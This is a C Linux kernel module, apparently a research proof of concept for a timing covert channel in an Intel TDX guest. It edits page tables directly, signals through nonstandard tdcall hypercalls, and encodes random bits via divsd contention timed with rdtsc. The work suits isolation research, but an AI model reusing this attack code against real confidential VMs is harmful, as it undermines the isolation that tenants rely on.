#include <linux/init.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/mm.h>
#include <asm/io.h>
#include <asm/smp.h>
#include <asm/tlbflush.h>
#include <linux/slab.h>
#include <asm/desc.h>
#include <asm/current.h>
#include <linux/context_tracking.h>
#include <linux/cdev.h>
#include <asm/desc.h>
#include <asm/apic.h>
#include <asm/msr-index.h>
#include <linux/delay.h>
#include <linux/gfp.h>
#include <linux/module.h> /* Needed by all modules */ 
#include <asm/uaccess.h>
#include <linux/printk.h> /* Needed for pr_info() */ 
#include <linux/completion.h>
#include <linux/kthread.h>
#include <linux/threads.h>
#include <asm/unwind_hints.h>
#include <linux/objtool.h>
#include "int.h"



#define ATTACKER KERN_INFO "attacker: "
void invlpg(void *x) {
   asm volatile("invlpg (%0)" ::"r" (x) : "memory");
}
uint64_t rdtsc_nofences(void) {
  uint64_t a, d;
  asm volatile("rdtsc" : "=a"(a), "=d"(d) ::"memory");
  return (d << 32) | a;
}
void clflush_(void *mem) {
  asm volatile("clflush (%0)"::"r"(mem):"memory");
}
void mfence(void) {
  asm volatile("mfence":::"memory");
}
void lfence(void) {
  asm volatile("lfence":::"memory");
}
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

char data[1024*1024]__attribute__((aligned(4096)));

int init_module(void) 
{


  printk("TDX: thrd aaa\n");
  uint64_t cr3;
  asm volatile("mov %%cr3, %0":"=r"(cr3)::"memory");
  uint64_t *pml4 = page_address(pfn_to_page(cr3/4096));
  printk("TDX: %lx\n", cr3);
  printk("TDX: %lx\n", pml4[511]);
  //if ((pml4[256]&1) == 0) {
    uint64_t *pdpt = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pml4[256] = virt_to_phys(pdpt)|3;
    uint64_t *pd = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pdpt[0] = virt_to_phys(pd)|3;
    //uint64_t *pt = (uint64_t *)get_zeroed_page(GFP_KERNEL);
    pd[0] =     0xfffffc0000000ULL|0x83;
    //pt[0] = 3|0xffffffffff000ULL;
  volatile uint64_t *addr = (uint64_t *)0xffff800000000000ULL;

  asm volatile(
        "xor %%rax, %%rax; xor %%r10, %%r10; mov $0xff00, %%rcx; mov $0x40000069, %%r12; mov $1, %%r13; mov $10, %%r11;tdcall;"
        :::"r8", "r9","r10", "r11", "r12", "r13", "r14", "r15", "rax","rcx", "rdx", "rsi", "rdi","rbx", "memory");
  invlpg(addr);
  serialize();
  printk("TDX out: %lx\n", *addr);

  unsigned long pgs = __get_free_pages(GFP_KERNEL, 9);
  memset((void*)pgs, 0, 1024ULL*1024ULL*2);
  char *addr2 = (char *)pgs+64*310;
  const size_t SETS = 12;
  size_t WINDOW = 5000;


  get_random_bytes(data, 1024*1024);
  memcpy(addr+2, data, 1024*1024);


  while (*addr != 1) asm volatile("":::"memory");
  serialize();
  size_t e = rdtsc_nofences();
  *addr = 2;
  

  for (size_t i = 0; i < 1024*128; ++i) {
    e += WINDOW;
    lfence();
    if((data[i>>3]>>(i&7))&1) {
      //maccess(addr2);
      for (; e > rdtsc_nofences();) {
        asm volatile(
            ".rept 32\n"
            //"popcnt %%r8, %%r8\n"
            //"popcnt %%r9, %%r9\n"
            //"popcnt %%r10, %%r10\n"
            //"popcnt %%r11, %%r11\n"
            "divsd %%xmm0,%%xmm0\n"
            "divsd %%xmm1,%%xmm1\n"
            "divsd %%xmm2,%%xmm2\n"
            "divsd %%xmm3,%%xmm3\n"
            ".endr\n"
            ::: "r8", "r9", "r10", "r11", "memory");
       }

    } else
    while (rdtsc_nofences() < e)asm volatile("":::"memory");
  }
  asm volatile("sti":::"memory");

  free_pages(pgs, 9);
  serialize();
  asm volatile(
        "xor %%rax, %%rax; xor %%r10, %%r10; mov $0xff00, %%rcx; mov $0x40000069, %%r12; mov $2, %%r13; mov $10, %%r11;tdcall;"
        :::"r8", "r9","r10", "r11", "r12", "r13", "r14", "r15", "rax","rcx", "rdx", "rsi", "rdi","rbx", "memory");

  printk("tsc: %lu\n", tsc_khz);
  return 0;

}


 

void cleanup_module(void) 
{ 
  pr_info("unload.\n"); 
  msleep(500);
} 

 

MODULE_LICENSE("GPL");
